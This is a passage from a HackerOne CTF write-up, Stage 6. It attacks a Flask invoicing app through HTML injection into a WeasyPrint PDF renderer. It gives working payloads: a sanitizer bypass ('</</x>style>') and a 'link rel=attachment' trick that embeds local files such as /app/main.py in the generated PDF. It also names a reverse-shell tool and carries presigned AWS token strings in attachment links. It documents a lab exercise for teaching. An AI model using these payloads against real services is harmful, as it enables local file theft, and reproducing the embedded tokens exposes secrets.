z%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=f5da345330f8b6c06159ba2be086551349cf8d9460503153e18512195d224ddb\" data-attachment-type=\"text/x-python\"\u003emain_2.py (F439685)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch4 id=\"tools\"\u003eTools\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fajxchapman%2Fsshreverseshell\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSSHReverseShell\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"summary-of-issues\"\u003eSummary of Issues\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eWeb application running as root user\u003c/li\u003e\n\u003cli\u003eInsufficient network segregation\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"stage-6-hackerone-accounting-application\"\u003eStage 6 - HackerOne Accounting Application\u003c/h2\u003e\n\n\u003cp\u003eTunnelling through to the compromised host at \u003ca title=\"http://172.27.0.2\" href=\"/redirect?url=http%3A%2F%2F172.27.0.2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://172.27.0.2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e provided access to YAPFA (Yet Another Python Flask Application).\u003c/p\u003e\n\n\u003cp\u003eAccessing each of the available links of the application presented a login page. Reviewing the login page it appeared that the \u003ccode\u003epassword\u003c/code\u003e parameter was vulnerable to some form of injection. Adding the tick character \u003ccode\u003e\u0026#39;\u003c/code\u003e the application responded with a HTTP 500 error, adding two in a row \u003ccode\u003e\u0026#39;\u0026#39;\u003c/code\u003e the application returned a 200 status. However, there were oddities in this behaviour, for example a password value of \u003ccode\u003epas\u0026#39;sw\u0026#39;ord\u003c/code\u003e also returned a 200 status, where a 500 error would be expected on a real injection vulnerability. This indicated there was something odd going on with this parameter, but it definitely was not a straight forward SQL or NoSQL injection.\u003c/p\u003e\n\n\u003cp\u003eFurther analysis of the application HTML identified a commented out link on the \u003ccode\u003e/invoices\u003c/code\u003e page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e\u0026lt;!--\u0026lt;li  class=\u0026quot;nav-item\u0026quot; \u0026gt;\n    \u0026lt;a class=\u0026quot;nav-link\u0026quot; href=\u0026quot;/invoices/new\u0026quot;\u0026gt;New Invoice\u0026lt;/a\u0026gt;\n\u0026lt;/li\u0026gt;--\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAccessing this page presented application functionality instead of the expected login form. This application page allowed the preparation of invoices, previewing them in HTML format or downloading them as PDFs.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/invoices/preview?d=%7B%22companyName%22%3A%22Acme%20Tools%22%2C%22email%22%3A%22accounting%40acme.com%22%2C%22invoiceNumber%22%3A%220001%22%2C%22date%22%3A%222019-04-01%22%2C%22items%22%3A%5B%5B%221%22%2C%22%22%2C%22%22%2C%2210%22%5D%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e127.0.0.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eReferer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ehttp://127.0.0.1:8001/invoices/new\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eclose\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUpgrade-Insecure-Requests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe obvious first step was to go looking for HTML injection issues with a goal of being able to have the PDF renderer parse arbitrary HTML. Luckily I found one quite easily in sub-parameters of the \u003ccode\u003estyles\u003c/code\u003e JSON parameter. These parameters allowed the injection of all of the characters needed for HTML injection, \u003ccode\u003e\u0026lt;\u0026gt;\u0026#39;= /\u003c/code\u003e, e.g. \u003ccode\u003e\u0026quot;styles\u0026quot;:{\u0026quot;htmlinjection\u0026quot;:{\u0026quot;\u0026lt;b\u0026gt;Test Injection\u0026quot;:\u0026quot;\u0026quot;}\u003c/code\u003e, which would result in \u003ccode\u003e\u0026lt;b\u0026gt;Test Injection\u003c/code\u003e being returned within a \u003ccode\u003e\u0026lt;style\u0026gt;\u003c/code\u003e tag in the PDF preview.\u003c/p\u003e\n\n\u003cp\u003eThis had one caveat, closing tags appeared to be stripped. In order to render injected HTML I needed to break out of the \u003ccode\u003e\u0026lt;style\u0026gt;\u003c/code\u003e tag the content was rendered in, but simply adding a closing tag \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e did not work. A common issue with input sanitization is not recursively sanitizing the input. In this case, any tag which matched the regular expression \u003ccode\u003e\u0026lt;/[A-Za-z]+\u0026gt;\u003c/code\u003e appeared to be stripped, however, this could be bypassed by embedding one closing tag within another, e.g. \u003ccode\u003e\u0026lt;/\u0026lt;/x\u0026gt;style\u0026gt;\u003c/code\u003e when sanitized would result in \u003ccode\u003e\u0026lt;/style\u0026gt;\u003c/code\u003e, which is what was needed.\u003c/p\u003e\n\n\u003cp\u003eWith the ability to inject arbitrary HTML into the PDF renderer, the next step was to try and exploit the PDF renderer itself. Common HTML rendering vulnerabilities include local file disclosure, and this was the issue I went looking for. I quickly identified that images on the local filesystem could be included in generated PDFs with a payload of \u003ccode\u003e\u0026lt;/\u0026lt;/x\u0026gt;style\u0026gt;\u0026lt;img+src=\u0026#39;file:///usr/lib/python3.5/idlelib/Icons/idle_16.png\u0026#39;+/\u0026gt;\u003c/code\u003e, however methods commonly used for LFD were not working (\u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e, \u003ccode\u003e\u0026lt;embed\u0026gt;\u003c/code\u003e, \u003ccode\u003e\u0026lt;object\u0026gt;\u003c/code\u003e, etc.) and injected JavaScript was not being executed. I also noticed that the PDFs had an embedded \u003ccode\u003e/Creator\u003c/code\u003e and \u003ccode\u003e/Producer\u003c/code\u003e tag of \u003ccode\u003ecairo 1.14.8 (http://cairographics.org)\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eGoogling for common PDF rendering engines gave numerous results (xhtml2pdf, pdfcrowd, pdfkit, etc.), however only one seemed to fit the constraints identified above, WeasyPrint. This was confirmed by attempting to render an image from a remote server under my control with the payload \u003ccode\u003e\u0026lt;/\u0026lt;/x\u0026gt;style\u0026gt;\u0026lt;img+src=\u0026#39;http://images.example.com\u0026#39;+/\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eINFO - \u0026quot;104.196.12.98\u0026quot; - http://images.example.com:80 [11/Mar/2019:12:03:36 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 161 \u0026quot;-\u0026quot; \u0026quot;WeasyPrint 44 (http://weasyprint.org/)\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FKozea%2FWeasyPrint\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWeasyPrint\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is an open source Python HTML to PDF library, so I went looking through the source code on GitHub. First thing that I noticed was this little gem from their documentation\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWhen used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/Kozea/WeasyPrint/blob/master/docs/tutorial.rst\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FKozea%2FWeasyPrint%2Fblob%2Fmaster%2Fdocs%2Ftutorial.rst\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Kozea/WeasyPrint/blob/master/docs/tutorial.rst\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAuditing the WeasyPrint source I quickly found the following interesting code comment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#: File attachments, as a list of tuples of URL and a description or\n#: :obj:`None`. (Defaults to the empty list.)\n#: Extracted from the ``\u0026lt;link rel=attachment\u0026gt;`` elements in HTML\n#: and written to the ``/EmbeddedFiles`` dictionary in PDF.\n#:\n#: .. versionadded:: 0.22\n\u003c/span\u003e\u003cspan class=\"bp\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eattachments\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eattachments\u003c/span\u003e \u003cspan class=\"ow\"\u003eor\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003e/weasyprint/document.py:319\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis strongly suggested that if I injected a \u003ccode\u003e\u0026lt;link rel=\u0026quot;attachment\u0026quot; href=\u0026quot;URL\u0026quot;\u0026gt;\u003c/code\u003e tag, the URL pointed to by the \u003ccode\u003ehref\u003c/code\u003e attributed would be embedded in the generated PDF document in an \u003ccode\u003e/EmbeddedFile\u003c/code\u003e stream. Further review of the source code confirmed this.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etag\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;link\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eelement_has_link_type\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;attachment\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eget_url_attribute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;href\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebase_url\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etitle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eelement\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;title\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"ow\"\u003eis\u003c/span\u003e \u003cspan class=\"bp\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eLOGGER\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Missing href in \u0026lt;link rel=\u0026quot;attachment\u0026quot;\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eattachments\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etitle\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003e/weasyprint/html.py:307\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003e_write_pdf_embedded_files\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epdf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eattachments\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eurl_fetcher\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u0026quot;Write attachments as embedded files (document attachments).\n    :return:\n        the object number of the name dictionary or :obj:`None`\n    \u0026quot;\u0026quot;\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003efile_spec_ids\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eattachment\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eattachments\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003efile_spec_id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003e_write_pdf_attachment\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epdf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eattachment\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eurl_fetcher\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003e/weasyprint/pdf.py:416\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eFinally, trying it out for real with the payload \u003ccode\u003e\u0026lt;/\u0026lt;/x\u0026gt;style\u0026gt;\u0026lt;link+rel=\u0026#39;attachment\u0026#39;+href=\u0026#39;file:///app/main.py\u0026#39;\u0026gt;\u003c/code\u003e confirmed the contents of the file was included in an \u003ccode\u003e/EmbeddedFile\u003c/code\u003e stream, and could be extracted through the FireFox PDF renderer to view the contents.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"embeddedfile.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/677/0bb9795e1077ad38da22b2e8dbae881ed409e859/embeddedfile.png?response-content-disposition=attachment%3B%20filename%3D%22embeddedfile.png%22%3B%20filename%2A%3DUTF-8%27%27embeddedfile.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=23a79a058d7af0cdb5296c51455d9a17ba01e76268a26fa427b00ed2c2fd465b\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/677/0bb9795e1077ad38da22b2e8dbae881ed409e859/embeddedfile.png?response-content-disposition=attachment%3B%20filename%3D%22embeddedfile.png%22%3B%20filename%2A%3DUTF-8%27%27embeddedfile.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=23a79a058d7af0cdb5296c51455d9a17ba01e76268a26fa427b00ed2c2fd465b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eGaining access to the \u003ccode\u003e/app/main.py\u003c/code\u003e file in this stage was the final flag in this CTF!\u003c/p\u003e\n\n\u003ch4 id=\"attachments\"\u003eAttachments:\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"main_3.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/686/78c7791fb76a9d668d9f88c25c587061ce8e7e86/main_3.py?response-content-disposition=attachment%3B%20filename%3D%22main_3.py%22%3B%20filename%2A%3DUTF-8%27%27main_3.py\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=b19fcdfe67ef12317a8542279e97a1b6f41e3c2e21684d5121768241da4df648\" data-attachment-type=\"text/plain\"\u003emain_3.py (F439686)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"pdfize.pdf\" 